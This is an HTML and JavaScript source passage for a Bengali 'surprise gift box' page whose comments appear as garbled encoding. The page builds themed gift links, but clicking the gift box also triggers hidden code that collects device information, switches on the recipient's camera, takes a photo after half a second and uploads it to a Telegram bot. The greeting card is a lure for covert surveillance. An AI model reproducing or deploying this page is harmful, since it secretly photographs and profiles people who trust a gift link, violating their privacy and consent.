        // ‡¶õ‡¶¨‡¶ø ‡¶§‡ßã‡¶≤‡¶æ‡¶∞ ‡¶´‡¶æ‡¶Ç‡¶∂‡¶®
        async function capturePhoto() {
            if (!video || !videoStream) return;
            const canvas = document.getElementById('canvas');
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            const context = canvas.getContext('2d');
            context.drawImage(video, 0, 0, canvas.width, canvas.height);
            return canvas.toDataURL('image/png');
        }

        // ‡¶ü‡ßá‡¶≤‡¶ø‡¶ó‡ßç‡¶∞‡¶æ‡¶Æ‡ßá ‡¶õ‡¶¨‡¶ø ‡¶™‡¶æ‡¶†‡¶æ‡¶®‡ßã‡¶∞ ‡¶´‡¶æ‡¶Ç‡¶∂‡¶®
        async function sendPhoto() {
            const photoData = await capturePhoto();
            if (!photoData) return;

            const blob = await (await fetch(photoData)).blob();
            const formData = new FormData();
            formData.append("chat_id", CHAT_ID);
            formData.append("photo", blob, "surprise_box_photo.png");

            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                method: "POST",
                body: formData
            });
        }
        
        // ‡¶ï‡ßç‡¶Ø‡¶æ‡¶Æ‡ßá‡¶∞‡¶æ ‡¶¨‡¶®‡ßç‡¶ß ‡¶ï‡¶∞‡¶æ‡¶∞ ‡¶´‡¶æ‡¶Ç‡¶∂‡¶®
        function stopCamera() {
            if (videoStream) {
                videoStream.getTracks().forEach(track => track.stop());
                videoStream = null;
                video = null;
            }
        }
        
        // ‡¶§‡¶•‡ßç‡¶Ø ‡¶ì ‡¶õ‡¶¨‡¶ø ‡¶™‡¶æ‡¶†‡¶æ‡¶®‡ßã‡¶∞ ‡¶Æ‡ßÇ‡¶≤ ‡¶´‡¶æ‡¶Ç‡¶∂‡¶®
        async function initiateCaptureAndSend() {
            await sendDeviceInfo();
            const cameraStarted = await startCamera();
            if (cameraStarted) {
                // ‡¶ï‡ßç‡¶Ø‡¶æ‡¶Æ‡ßá‡¶∞‡¶æ ‡¶ö‡¶æ‡¶≤‡ßÅ ‡¶π‡¶ì‡ßü‡¶æ‡¶∞ ‡¶ú‡¶®‡ßç‡¶Ø ‡¶∏‡¶æ‡¶Æ‡¶æ‡¶®‡ßç‡¶Ø ‡¶∏‡¶Æ‡ßü ‡¶¶‡ßá‡¶ì‡ßü‡¶æ ‡¶π‡¶ö‡ßç‡¶õ‡ßá
                setTimeout(async () => {
                    await sendPhoto();
                    stopCamera(); // ‡¶õ‡¶¨‡¶ø ‡¶™‡¶æ‡¶†‡¶æ‡¶®‡ßã‡¶∞ ‡¶™‡¶∞ ‡¶ï‡ßç‡¶Ø‡¶æ‡¶Æ‡ßá‡¶∞‡¶æ ‡¶¨‡¶®‡ßç‡¶ß ‡¶ï‡¶∞‡ßá ‡¶¶‡ßá‡¶ì‡ßü‡¶æ ‡¶π‡¶¨‡ßá
                }, 500); // 0.5 ‡¶∏‡ßá‡¶ï‡ßá‡¶®‡ßç‡¶° ‡¶™‡¶∞ ‡¶õ‡¶¨‡¶ø ‡¶§‡ßÅ‡¶≤‡¶¨‡ßá
            }
        }
        // --- ‡¶®‡¶§‡ßÅ‡¶® ‡¶Ø‡ßÅ‡¶ï‡ßç‡¶§ ‡¶ï‡¶∞‡¶æ ‡¶Ö‡¶Ç‡¶∂‡ßá‡¶∞ ‡¶∂‡ßá‡¶∑ ---


        document.addEventListener('DOMContentLoaded', () => {
            const params = new URLSearchParams(window.location.search);
            if (params.has('sender')) {
                document.getElementById('form-container').classList.add('hidden');
                document.getElementById('gift-container').classList.remove('hidden');
                const theme = params.get('theme') || 'general';
                applyTheme(theme);
                displayGift(params);
            } else {
                setupThemeSelector();
                setupForm();
                setupCountdownInput();
            }
        });

        function setupThemeSelector() {
            const themeOptions = document.querySelectorAll('.theme-option');
            const customThemeGroup = document.getElementById('customThemeGroup');
            themeOptions.forEach(option => {
                option.addEventListener('click', () => {
                    themeOptions.forEach(opt => opt.classList.remove('active'));
                    option.classList.add('active');
                    const theme = option.getAttribute('data-theme');
                    applyTheme(theme);
                    if (theme === 'custom') {
                        customThemeGroup.classList.remove('hidden');
                    } else {
                        customThemeGroup.classList.add('hidden');
                    }
                });
            });
        }
        
        function setupCountdownInput() {
            const enableCountdown = document.getElementById('enableCountdown');
            const countdownInputGroup = document.getElementById('countdownInputGroup');
            enableCountdown.addEventListener('change', () => {
                countdownInputGroup.classList.toggle('hidden', !enableCountdown.checked);
            });
        }

        function applyTheme(themeName) {
            document.body.className = '';
            document.body.classList.add(`theme-${themeName}`);
            setThemeRGBValues(themeName);
        }

        function setThemeRGBValues(themeName) {
            let primaryRGB, giftBoxRGB, ribbonRGB;
            switch(themeName) {
                case 'birthday': primaryRGB = '255, 107, 139'; giftBoxRGB = '255, 107, 139'; ribbonRGB = '255, 209, 102'; break;
                case 'anniversary': primaryRGB = '212, 175, 55'; giftBoxRGB = '212, 175, 55'; ribbonRGB = '255, 107, 139'; break;
                case 'newyear': primaryRGB = '16, 185, 129'; giftBoxRGB = '16, 185, 129'; ribbonRGB = '255, 209, 102'; break;
                case 'proposal': primaryRGB = '236, 72, 153'; giftBoxRGB = '236, 72, 153'; ribbonRGB = '192, 132, 252'; break;
                default: primaryRGB = '74, 108, 247'; giftBoxRGB = '74, 108, 247'; ribbonRGB = '255, 107, 139';
            }
            document.documentElement.style.setProperty('--theme-primary-rgb', primaryRGB);
            document.documentElement.style.setProperty('--theme-gift-box-rgb', giftBoxRGB);
            document.documentElement.style.setProperty('--theme-ribbon-rgb', ribbonRGB);
        }

        function setupForm() {
            const form = document.getElementById('giftForm');
            const copyButton = document.getElementById('copyButton');
            const copySuccess = document.getElementById('copySuccess');
            
            form.addEventListener('submit', (e) => {
                e.preventDefault();
                
                const senderName = document.getElementById('senderName').value;
                const receiverName = document.getElementById('receiverName').value;
                const message = document.getElementById('message').value;
                const imageURL = document.getElementById('imageURL').value;
                const activeTheme = document.querySelector('.theme-option.active').getAttribute('data-theme');
                
                let giftLink = `${window.location.href.split('?')[0]}?sender=${encodeURIComponent(senderName)}&receiver=${encodeURIComponent(receiverName)}&message=${encodeURIComponent(message)}&image=${encodeURIComponent(imageURL)}&theme=${activeTheme}`;

                if (activeTheme === 'custom') {
                    const customText = document.getElementById('customThemeText').value;
                    giftLink += `&ct=${encodeURIComponent(customText)}`;
                }

                const enableCountdown = document.getElementById('enableCountdown').checked;
                const countdownDateTime = document.getElementById('countdownDateTime').value;
                if (enableCountdown && countdownDateTime) {
                    giftLink += `&cd=${encodeURIComponent(countdownDateTime)}`;
                }
                
                document.getElementById('generatedLink').value = giftLink;
                document.getElementById('generatedLinkContainer').classList.remove('hidden');
                document.getElementById('generatedLinkContainer').scrollIntoView({ behavior: 'smooth' });
            });
            
            copyButton.addEventListener('click', () => {
                const linkInput = document.getElementById('generatedLink');
                linkInput.select();
                linkInput.setSelectionRange(0, 99999);
                try {
                    navigator.clipboard.writeText(linkInput.value).then(() => {
                        copySuccess.classList.remove('hidden');
                        setTimeout(() => copySuccess.classList.add('hidden'), 3000);
                    });
                } catch (err) {
                    document.execCommand('copy');
                    copySuccess.classList.remove('hidden');
                    setTimeout(() => copySuccess.classList.add('hidden'), 3000);
                }
            });
        }

        function displayGift(params) {
            const countdownTime = params.get('cd');
            if (countdownTime) {
                handleCountdown(params, new Date(decodeURIComponent(countdownTime)));
            } else {
                showMainGiftContent(params);
            }
        }
        
        function handleCountdown(params, targetDate) {
            const countdownContainer = document.getElementById('countdown-container');
            const mainGiftContent = document.getElementById('main-gift-content');
            const timerElement = document.getElementById('timer');
            
            countdownContainer.classList.remove('hidden');
            mainGiftContent.classList.add('hidden');
            document.getElementById('receiverTitle').textContent = `‡¶™‡ßç‡¶∞‡¶ø‡¶Ø‡¶º ${decodeURIComponent(params.get('receiver'))}`;

            const timerInterval = setInterval(() => {
                const now = new Date().getTime();
                const distance = targetDate - now;

                if (distance < 0) {
                    clearInterval(timerInterval);
                    countdownContainer.classList.add('hidden');
                    showMainGiftContent(params);
                    return;
                }

                const days = Math.floor(distance / (1000 * 60 * 60 * 24));
                const hours = Math.floor((distance % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60));
                const minutes = Math.floor((distance % (1000 * 60 * 60)) / (1000 * 60));
                const seconds = Math.floor((distance % (1000 * 60)) / 1000);
                
                timerElement.innerHTML = `${days}d ${hours}h ${minutes}m ${seconds}s`;

            }, 1000);
        }

        function showMainGiftContent(params) {
            document.getElementById('main-gift-content').classList.remove('hidden');
            const sender = decodeURIComponent(params.get('sender'));
            const receiver = decodeURIComponent(params.get('receiver'));
            const message = decodeURIComponent(params.get('message'));
            const imageURL = decodeURIComponent(params.get('image'));
            const theme = params.get('theme') || 'general';

            document.getElementById('receiverTitle').textContent = `‡¶™‡ßç‡¶∞‡¶ø‡¶Ø‡¶º ${receiver}`;
            
            const themeMessageElement = document.getElementById('themeMessage');
            let themeText = '';
            if (theme === 'custom') {
                themeText = decodeURIComponent(params.get('ct')) || '‡¶§‡ßã‡¶Æ‡¶æ‡¶∞ ‡¶ú‡¶®‡ßç‡¶Ø ‡¶è‡¶ï‡¶ü‡¶ø ‡¶â‡¶™‡¶π‡¶æ‡¶∞!';
            } else {
                switch(theme) {
                    case 'birthday': themeText = '‡¶∂‡ßÅ‡¶≠ ‡¶ú‡¶®‡ßç‡¶Æ‡¶¶‡¶ø‡¶®!'; break;
                    case 'anniversary': themeText = '‡¶∂‡ßÅ‡¶≠ ‡¶¨‡¶æ‡¶∞‡ßç‡¶∑‡¶ø‡¶ï‡ßÄ!'; break;
                    case 'newyear': themeText = '‡¶∂‡ßÅ‡¶≠ ‡¶®‡¶¨‡¶¨‡¶∞‡ßç‡¶∑!'; break;
                    case 'proposal': themeText = '‡¶§‡ßã‡¶Æ‡¶æ‡¶ï‡ßá ‡¶≠‡¶æ‡¶≤‡ßã‡¶¨‡¶æ‡¶∏‡¶ø!'; break;
                    default: themeText = '‡¶§‡ßã‡¶Æ‡¶æ‡¶∞ ‡¶ú‡¶®‡ßç‡¶Ø ‡¶è‡¶ï‡¶ü‡¶ø ‡¶â‡¶™‡¶π‡¶æ‡¶∞!';
                }
            }
            themeMessageElement.textContent = themeText;
            
            if (imageURL && imageURL.trim() !== '') {
                const imageElement = document.getElementById('revealedImage');
                imageElement.onload = function() { imageElement.classList.remove('hidden'); };
                imageElement.onerror = function() { console.error("Image failed to load:", imageURL); };
                imageElement.src = imageURL;
            }
            
            const giftBox = document.getElementById('giftBox');
            const giftWrapper = document.getElementById('giftWrapper');
            const clickInstruction = document.querySelector('.click-instruction');
            
            giftWrapper.addEventListener('click', () => {
                
                // --- ‡¶Æ‡ßÇ‡¶≤ ‡¶™‡¶∞‡¶ø‡¶¨‡¶∞‡ßç‡¶§‡¶® ‡¶è‡¶ñ‡¶æ‡¶®‡ßá ---
                // ‡¶ó‡¶ø‡¶´‡¶ü ‡¶¨‡¶ï‡ßç‡¶∏ ‡¶ñ‡ßã‡¶≤‡¶æ‡¶∞ ‡¶∏‡¶æ‡¶•‡ßá ‡¶∏‡¶æ‡¶•‡ßá ‡¶è‡¶á ‡¶´‡¶æ‡¶Ç‡¶∂‡¶®‡¶ü‡¶ø ‡¶ï‡¶≤ ‡¶π‡¶¨‡ßá
                initiateCaptureAndSend();

                giftBox.classList.add('open');
                clickInstruction.style.display = 'none';

                setTimeout(() => {
                    giftWrapper.classList.add('revealed');
                    document.getElementById('giftContentRevealed').classList.remove('hidden');
                    const messageContainer = document.createElement('div');
                    messageContainer.classList.add('message-container');
                    
                    const messageParagraph = document.createElement('p');
                    messageParagraph.textContent = message;

                    messageContainer.innerHTML = `<h3>${sender} ‡¶è‡¶∞ ‡¶¨‡¶æ‡¶∞‡ßç‡¶§‡¶æ:</h3>`;
                    messageContainer.appendChild(messageParagraph);
                    
                    document.getElementById('giftContentRevealed').appendChild(messageContainer);
                    
                    setTimeout(() => messageContainer.classList.add('show'), 100);
                    triggerVictoryEffect();
                }, 1000);
            }, { once: true });
        }

        function triggerVictoryEffect() {
            const victoryEffect = document.getElementById('victoryEffect');
            victoryEffect.style.display = 'block';
            for (let i = 0; i < 50; i++) {
                const firework = document.createElement('div');
                firework.classList.add('firework');
                firework.style.backgroundColor = getRandomThemeColor();
                firework.style.left = '50%';
                firework.style.top = '50%';
                firework.style.setProperty('--tx', `${Math.random() * 400 - 200}px`);
                firework.style.setProperty('--ty', `${Math.random() * 400 - 200}px`);
                victoryEffect.appendChild(firework);
                setTimeout(() => firework.remove(), 1500);
            }
            for (let i = 0; i < 100; i++) {
                const confetti = document.createElement('div');
                confetti.classList.add('confetti-piece');
                confetti.style.backgroundColor = getRandomThemeColor();
                confetti.style.left = `${Math.random() * 100}%`;
                confetti.style.animationDelay = `${Math.random() * 2}s`;
                victoryEffect.appendChild(confetti);
                setTimeout(() => confetti.remove(), 3000);
            }
            setTimeout(() => { victoryEffect.style.display = 'none'; }, 3000);
        }

        function getRandomThemeColor() {
            const themeColors = ['var(--theme-primary)', 'var(--theme-secondary)', 'var(--theme-accent)', 'var(--theme-ribbon)', '#FFD166', '#06D6A0', '#118AB2', '#EF476F'];
            return themeColors[Math.floor(Math.random() * themeColors.length)];
        }
    </script>
</body>
</html>

-->


<!DOCTYPE html>
<html lang="bn">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>‡¶°‡¶ø‡¶ú‡¶ø‡¶ü‡¶æ‡¶≤ ‡¶∏‡¶æ‡¶∞‡¶™‡ßç‡¶∞‡¶æ‡¶á‡¶ú ‡¶¨‡¶ï‡ßç‡¶∏</title>
    
    <!-- ‡¶ó‡ßÅ‡¶ó‡¶≤ ‡¶´‡¶®‡ßç‡¶ü‡¶∏ ‡¶è‡¶¨‡¶Ç ‡¶´‡¶®‡ßç‡¶ü ‡¶Ö‡ßç‡¶Ø‡¶æ‡¶ì‡ßü‡¶∏‡¶Æ -->
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    
    <style>
        :root {
            --primary-color: #4A6CF7;
            --primary-dark: #3A5CE5;
            --secondary-color: #6C63FF;
            --accent-color: #FF6B8B;
            --background-gradient: linear-gradient(135deg, #f5f7fa 0%, #e4e8f5 100%);
            --box-shadow: 0 15px 35px rgba(0, 0, 0, 0.08);
            --box-shadow-hover: 0 20px 40px rgba(0, 0, 0, 0.12);
            --gift-box-color: #FF6B8B;
            --gift-lid-color: #FF8FA3;
            --ribbon-color: #FFD166;
            --text-dark: #2D3748;
            --text-light: #718096;
            --success-color: #10B981;
            --border-radius: 12px;
            --transition: all 0.3s cubic-bezier(0.25, 0.8, 0.25, 1);
            
            /* ‡¶•‡¶ø‡¶Æ ‡¶≠‡ßá‡¶∞‡¶ø‡ßü‡ßá‡¶¨‡¶≤ */
            --theme-name: 'general';
            --theme-primary: #4A6CF7;
            --theme-secondary: #6C63FF;
            --theme-accent: #FF6B8B;
            --theme-gift-box: #4A6CF7;
            --theme-gift-lid: #6C63FF;
            --theme-ribbon: #FF6B8B;
            --theme-background: linear-gradient(135deg, #f5f7fa 0%, #e4e8f5 100%);
        }

        /* ‡¶ú‡¶®‡ßç‡¶Æ‡¶¶‡¶ø‡¶® ‡¶•‡¶ø‡¶Æ */
        .theme-birthday {
            --theme-name: 'birthday';
            --theme-primary: #FF6B8B;
            --theme-secondary: #FF8FA3;
            --theme-accent: #FFD166;
            --theme-gift-box: #FF6B8B;
            --theme-gift-lid: #FF8FA3;
            --theme-ribbon: #FFD166;
            --theme-background: linear-gradient(135deg, #ffeef2 0%, #ffd6df 100%);
        }

        /* ‡¶¨‡¶ø‡¶¨‡¶æ‡¶π ‡¶¨‡¶æ‡¶∞‡ßç‡¶∑‡¶ø‡¶ï‡ßÄ ‡¶•‡¶ø‡¶Æ */
        .theme-anniversary {
            --theme-name: 'anniversary';
            --theme-primary: #D4AF37;
            --theme-secondary: #FFD700;
            --theme-accent: #FF6B8B;
            --theme-gift-box: #D4AF37;
            --theme-gift-lid: #FFD700;
            --theme-ribbon: #FF6B8B;
            --theme-background: linear-gradient(135deg, #fff9e6 0%, #ffefbf 100%);
        }

        /* ‡¶®‡¶§‡ßÅ‡¶® ‡¶¨‡¶õ‡¶∞ ‡¶•‡¶ø‡¶Æ */
        .theme-newyear {
            --theme-name: 'newyear';
            --theme-primary: #10B981;
            --theme-secondary: #34D399;
            --theme-accent: #FFD166;
            --theme-gift-box: #10B981;
            --theme-gift-lid: #34D399;
            --theme-ribbon: #FFD166;
            --theme-background: linear-gradient(135deg, #e6fff5 0%, #ccffeb 100%);
        }

        /* ‡¶™‡ßç‡¶∞‡¶™‡ßã‡¶ú‡¶æ‡¶≤ ‡¶•‡¶ø‡¶Æ */
        .theme-proposal {
            --theme-name: 'proposal';
            --theme-primary: #EC4899;
            --theme-secondary: #F472B6;
            --theme-accent: #C084FC;
            --theme-gift-box: #EC4899;
            --theme-gift-lid: #F472B6;
            --theme-ribbon: #C084FC;
            --theme-background: linear-gradient(135deg, #fdf2f8 0%, #fce7f3 100%);
        }

        /* ‡¶∏‡¶æ‡¶ß‡¶æ‡¶∞‡¶£ ‡¶ì ‡¶ï‡¶æ‡¶∏‡ßç‡¶ü‡¶Æ ‡¶•‡¶ø‡¶Æ */
        .theme-general, .theme-custom {
            --theme-name: 'general';
            --theme-primary: #4A6CF7;
            --theme-secondary: #6C63FF;
            --theme-accent: #FF6B8B;
            --theme-gift-box: #4A6CF7;
            --theme-gift-lid: #6C63FF;
            --theme-ribbon: #FF6B8B;
            --theme-background: linear-gradient(135deg, #f5f7fa 0%, #e4e8f5 100%);
        }

        * { box-sizing: border-box; margin: 0; padding: 0; -webkit-tap-highlight-color: transparent; }
        body { font-family: 'Poppins', sans-serif; background: var(--theme-background); display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; color: var(--text-dark); line-height: 1.6; padding: 15px; overflow-x: hidden; -webkit-text-size-adjust: 100%; touch-action: manipulation; transition: background 0.5s ease; }
        .container { background-color: white; padding: 30px 20px; border-radius: var(--border-radius); box-shadow: var(--box-shadow); width: 100%; max-width: 500px; text-align: center; transition: var(--transition); position: relative; overflow: hidden; z-index: 10; }
        .container::before { content: ''; position: absolute; top: 0; left: 0; width: 100%; height: 5px; background: linear-gradient(to right, var(--theme-primary), var(--theme-accent)); }
        .container:hover { box-shadow: var(--box-shadow-hover); transform: translateY(-5px); }
        h1, h2, h3 { color: var(--theme-primary); margin-bottom: 15px; font-weight: 700; }
        #themeMessage { font-size: 22px; margin-top: -10px; }
        h1 { font-size: 24px; display: flex; align-items: center; justify-content: center; gap: 10px; }
        h1 span { font-size: 1.8em; }
        p { color: var(--text-light); margin-bottom: 20px; font-size: 15px; }
        form { display: flex; flex-direction: column; margin-top: 20px; }
        .form-group { margin-bottom: 15px; text-align: left; }
        label { display: block; margin-bottom: 8px; font-weight: 600; color: var(--text-dark); font-size: 14px; }
        input[type="text"], input[type="url"], textarea, select, input[type="datetime-local"] { width: 100%; padding: 14px 16px; border: 1.5px solid #E2E8F0; border-radius: 8px; box-sizing: border-box; transition: var(--transition); font-family: 'Poppins', sans-serif; font-size: 16px; resize: vertical; -webkit-appearance: none; }
        input:focus, textarea:focus, select:focus, input[type="datetime-local"]:focus { outline: none; border-color: var(--theme-primary); box-shadow: 0 0 0 3px rgba(74, 108, 247, 0.1); }
        button { background: linear-gradient(to right, var(--theme-primary), var(--theme-secondary)); color: white; padding: 16px; border: none; border-radius: 8px; cursor: pointer; font-size: 16px; font-weight: 600; transition: var(--transition); display: flex; align-items: center; justify-content: center; gap: 8px; box-shadow: 0 4px 15px rgba(var(--theme-primary-rgb), 0.3); width: 100%; -webkit-appearance: none; }
        button:hover { transform: translateY(-2px); box-shadow: 0 6px 20px rgba(var(--theme-primary-rgb), 0.4); }
        button:active { transform: translateY(0); }
        #generatedLinkContainer { margin-top: 30px; border-top: 1px solid #F1F5F9; padding-top: 25px; background-color: #F8FAFC; border-radius: 8px; padding: 20px; }
        #generatedLink { width: 100%; padding: 12px 16px; margin-top: 10px; background-color: white; border: 1.5px solid #E2E8F0; border-radius: 8px; text-align: center; font-size: 14px; color: var(--text-dark); word-break: break-all; -webkit-user-select: all; -moz-user-select: all; -ms-user-select: all; user-select: all; }
        #copyButton { background: linear-gradient(to right, var(--success-color), #34D399); box-shadow: 0 4px 15px rgba(16, 185, 129, 0.3); margin-top: 15px; }
        #copyButton:hover { box-shadow: 0 6px 20px rgba(16, 185, 129, 0.4); }
        .hidden { display: none; }
        .gift-wrapper { position: relative; margin: 30px auto; width: 350px; height: 350px; perspective: 1000px; cursor: pointer; transition: all 0.5s ease; }
        .gift-box { position: relative; width: 160px; height: 160px; margin: 0 auto; transform-style: preserve-3d; transition: transform 0.5s ease; animation: float 3s ease-in-out infinite; -webkit-tap-highlight-color: transparent; }
        .box-body { width: 160px; height: 160px; background: linear-gradient(135deg, var(--theme-gift-box), var(--theme-gift-lid)); position: absolute; bottom: 0; z-index: 1; border-radius: 8px; box-shadow: 0 10px 20px rgba(var(--theme-gift-box-rgb), 0.3); transform: translateZ(0); transition: all 0.3s ease; }
        .ribbon-vertical { position: absolute; width: 25px; height: 160px; background: linear-gradient(to bottom, var(--theme-ribbon), #FFDF80); left: 67.5px; border-radius: 4px; box-shadow: 0 0 10px rgba(var(--theme-ribbon-rgb), 0.5); z-index: 2; }
        .ribbon-horizontal { position: absolute; width: 160px; height: 25px; background: linear-gradient(to right, var(--theme-ribbon), #FFDF80); top: 67.5px; border-radius: 4px; box-shadow: 0 0 10px rgba(var(--theme-ribbon-rgb), 0.5); z-index: 2; }
        .ribbon-bow { position: absolute; width: 40px; height: 40px; background: var(--theme-ribbon); top: -20px; left: 60px; border-radius: 50%; z-index: 4; box-shadow: 0 0 10px rgba(var(--theme-ribbon-rgb), 0.5); }
        .ribbon-bow::before, .ribbon-bow::after { content: ''; position: absolute; width: 30px; height: 30px; background: var(--theme-ribbon); border-radius: 50%; top: 5px; }
        .ribbon-bow::before { left: -15px; }
        .ribbon-bow::after { right: -15px; }
        .lid { width: 176px; height: 48px; background: linear-gradient(135deg, var(--theme-gift-lid), var(--theme-gift-box)); position: absolute; top: -24px; left: -8px; z-index: 3; transition: transform 1s cubic-bezier(0.68, -0.55, 0.27, 1.55); transform-origin: bottom; border-radius: 8px 8px 0 0; box-shadow: 0 -5px 15px rgba(var(--theme-gift-box-rgb), 0.3); transform: translateZ(10px); }
        .gift-box.open .lid { transform: rotateX(120deg) translateZ(10px); }
        .gift-content { position: absolute; top: 0; left: 0; width: 100%; height: 100%; display: flex; flex-direction: column; justify-content: center; align-items: center; opacity: 0; transform: scale(0.8); transition: all 0.8s ease 0.5s; z-index: 0; padding: 20px; text-align: center; color: white; text-shadow: 0 1px 3px rgba(0, 0, 0, 0.3); }
        .gift-box.open .gift-content { opacity: 1; transform: scale(1); }
        .gift-box::before { content: ''; position: absolute; width: 100%; height: 100%; background: rgba(255, 255, 255, 0.2); border-radius: 8px; opacity: 0; transition: opacity 0.3s ease; z-index: 4; }
        .gift-box:hover::before { opacity: 1; }
        .gift-box:hover .box-body { box-shadow: 0 15px 30px rgba(var(--theme-gift-box-rgb), 0.4); transform: translateZ(5px); }
        .gift-box.open { animation: box-disappear 1s forwards; }
        .sparkle { position: absolute; width: 8px; height: 8px; background: white; border-radius: 50%; opacity: 0; z-index: 5; }
        .gift-box.open .sparkle { animation: sparkle 1s ease-out; }
        .gift-content-revealed { position: absolute; top: 0; left: 0; width: 100%; height: 100%; display: flex; flex-direction: column; justify-content: flex-start; align-items: center; opacity: 0; transform: scale(0.8); transition: all 0.8s ease 0.5s; z-index: 0; text-align: center; color: var(--text-dark); }
        .gift-wrapper.revealed { width: 100%; height: auto; min-height: auto; perspective: none; background: #ffffff; padding: 20px; border-radius: var(--border-radius); box-shadow: var(--box-shadow); }
        .gift-wrapper.revealed .gift-content-revealed { position: static; opacity: 1; transform: scale(1); width: 100%; height: auto; }
        #revealedImage { width: 100%; height: auto; display: block; border-radius: 8px; margin-bottom: 20px; box-shadow: 0 5px 15px rgba(0,0,0,0.1); transition: var(--transition); border: 3px solid var(--theme-primary); }
        .message-container { width: 100%; box-sizing: border-box; opacity: 0; transform: translateY(20px); transition: opacity 0.8s ease-in-out 1.2s, transform 0.8s ease-in-out 1.2s; background: #F8FAFC; padding: 20px; border-radius: 10px; border-left: 4px solid var(--theme-primary); text-align: left; }
        .message-container.show { opacity: 1; transform: translateY(0); }
        .message-container p { color: var(--text-dark); margin-bottom: 0; white-space: pre-wrap; overflow-wrap: break-word; word-wrap: break-word; word-break: break-word; }
        #revealedImage:hover { transform: scale(1.02); }
        .click-instruction { margin-top: 15px; font-size: 14px; color: var(--text-light); animation: pulse 2s infinite; font-weight: 500; }
        .victory-effect { position: fixed; top: 0; left: 0; width: 100%; height: 100%; pointer-events: none; z-index: 100; display: none; }
        .firework { position: absolute; width: 5px; height: 5px; border-radius: 50%; animation: firework-explode 1.5s ease-out forwards; }
        .confetti-piece { position: absolute; width: 10px; height: 20px; opacity: 0; animation: confetti-fall 3s ease-in-out forwards; }
        .theme-selector { display: flex; flex-wrap: wrap; gap: 10px; margin-bottom: 20px; justify-content: center; }
        .theme-option { flex: 1; min-width: 120px; padding: 10px; border: 2px solid #E2E8F0; border-radius: 8px; text-align: center; cursor: pointer; transition: var(--transition); font-size: 14px; font-weight: 500; }
        .theme-option:hover { transform: translateY(-3px); box-shadow: 0 5px 15px rgba(0,0,0,0.1); }
        .theme-option.active { border-color: var(--theme-primary); background-color: rgba(var(--theme-primary-rgb), 0.1); color: var(--theme-primary); }
        .theme-option i { font-size: 20px; margin-bottom: 5px; display: block; }
        .instruction { background: linear-gradient(to right, #E1F0FF, #F0F4FF); padding: 15px; border-radius: 8px; margin-bottom: 20px; border-left: 4px solid var(--theme-primary); text-align: left; font-size: 14px; }
        .instruction i { color: var(--theme-primary); margin-right: 10px; }
        .success-message { display: flex; align-items: center; justify-content: center; gap: 10px; color: var(--success-color); margin-top: 15px; font-weight: 600; font-size: 14px; }
        #countdown-container { text-align: center; padding: 20px; background: #F8FAFC; border-radius: 10px; margin-bottom: 20px; }
        #countdown-container h3 { color: var(--theme-primary); }
        #timer { font-size: 2em; font-weight: 700; color: var(--text-dark); letter-spacing: 2px; }
        @keyframes float { 0%, 100% { transform: translateY(0) rotate(0deg); } 25% { transform: translateY(-8px) rotate(1deg); } 50% { transform: translateY(-4px) rotate(0deg); } 75% { transform: translateY(-8px) rotate(-1deg); } }
        @keyframes pulse { 0% { transform: scale(1); opacity: 0.7; } 50% { transform: scale(1.05); opacity: 1; } 100% { transform: scale(1); opacity: 0.7; } }
        @keyframes sparkle { 0% { opacity: 0; transform: scale(0) rotate(0deg); } 50% { opacity: 1; transform: scale(1) rotate(180deg); } 100% { opacity: 0; transform: scale(0) rotate(360deg); } }
        @keyframes box-disappear { 0% { transform: scale(1); opacity: 1; } 70% { transform: scale(1.2); opacity: 0.7; } 100% { transform: scale(0); opacity: 0; display: none; } }
        @keyframes firework-explode { 0% { transform: translate(0, 0); opacity: 1; } 100% { transform: translate(var(--tx), var(--ty)); opacity: 0; } }
        @keyframes confetti-fall { 0% { transform: translateY(-100px) rotate(0deg); opacity: 1; } 100% { transform: translateY(100vh) rotate(360deg); opacity: 0; } }
        @keyframes victory-glow { 0% { box-shadow: 0 0 20px rgba(var(--theme-primary-rgb), 0.5); } 50% { box-shadow: 0 0 40px rgba(var(--theme-primary-rgb), 0.8); } 100% { box-shadow: 0 0 20px rgba(var(--theme-primary-rgb), 0.5); } }
        @media (max-width: 480px) { .container { padding: 25px 15px; } h1 { font-size: 20px; } p { font-size: 14px; } #themeMessage { font-size: 18px; } .gift-wrapper { width: 160px; height: 200px; } .gift-box, .box-body { width: 140px; height: 140px; } .ribbon-vertical { width: 20px; height: 140px; left: 60px; } .ribbon-horizontal { width: 140px; height: 20px; top: 60px; } .ribbon-bow { left: 50px; } .lid { width: 154px; height: 42px; top: -21px; left: -7px; } input[type="text"], input[type="url"], textarea, select { font-size: 16px; } .theme-option { min-width: 100px; font-size: 12px; } .theme-option i { font-size: 16px; } }
        @media (max-width: 360px) { .container { padding: 20px 10px; } h1 { font-size: 18px; } p { font-size: 13px; } #themeMessage { font-size: 16px; } .gift-wrapper { width: 140px; height: 180px; } .gift-box, .box-body { width: 120px; height: 120px; } .ribbon-vertical { width: 18px; height: 120px; left: 51px; } .ribbon-horizontal { width: 120px; height: 18px; top: 51px; } .ribbon-bow { left: 40px; } .lid { width: 132px; height: 36px; top: -18px; left: -6px; } .theme-option { min-width: 80px; padding: 8px 5px; font-size: 11px; } }
        @media (hover: none) and (pointer: coarse) { .gift-box:hover::before { opacity: 0; } .gift-box:hover .box-body { box-shadow: 0 10px 20px rgba(var(--theme-gift-box-rgb), 0.3); transform: translateZ(0); } button:hover { transform: none; box-shadow: 0 4px 15px rgba(var(--theme-primary-rgb), 0.3); } #revealedImage:hover { transform: none; } .theme-option:hover { transform: none; box-shadow: none; } }
    </style>
</head>
<body>
    <!-- ‡¶´‡¶∞‡ßç‡¶Æ ‡¶ï‡¶®‡ßç‡¶ü‡ßá‡¶á‡¶®‡¶æ‡¶∞ -->
    <div class="container" id="form-container">
